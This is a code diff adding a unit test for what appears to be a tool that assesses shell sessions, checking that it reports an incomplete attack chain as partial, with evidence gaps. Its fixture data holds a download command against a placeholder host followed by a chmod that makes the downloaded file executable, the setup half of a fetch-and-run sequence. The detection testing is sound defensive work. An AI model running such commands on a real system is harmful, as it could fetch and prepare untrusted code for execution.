@@ -297,3 +297,26 @@ def test_frozen_phase3_known_answer_rebuilds_exactly(monkeypatch) -> None:
         key: len(projection[key]) for key in expected["counts"]
     } == expected["counts"]
     assert projection["authority"] == expected["authority"]
+
+
+def test_valid_incomplete_graph_chain_projects_as_partial_with_hypotheses() -> None:
+    payload = _payload({
+        "case_id": "phase3-incomplete-chain",
+        "events": [
+            ("wget https://example.invalid/a -O /tmp/a", "success"),
+            ("chmod 700 /tmp/a", "success"),
+        ],
+    })
+    report = build_session_assessment_v6(
+        [payload],
+        raw_events=payload["raw_events"],
+        behavior_policy_path=str(BEHAVIOR_POLICY),
+        classification_policy_path=str(CLASSIFICATION_POLICY),
+    )
+    projection = _projection(report)
+    assert [item["status"] for item in projection["chains"]] == ["partial"]
+    assert projection["chains"][0]["ai_eligible"] is True
+    assert len(projection["hypotheses"]) == 2
+    assert projection["evidence_gaps"] == [
+        "direct_transfer_event_missing", "execution_observation_missing"
+    ]
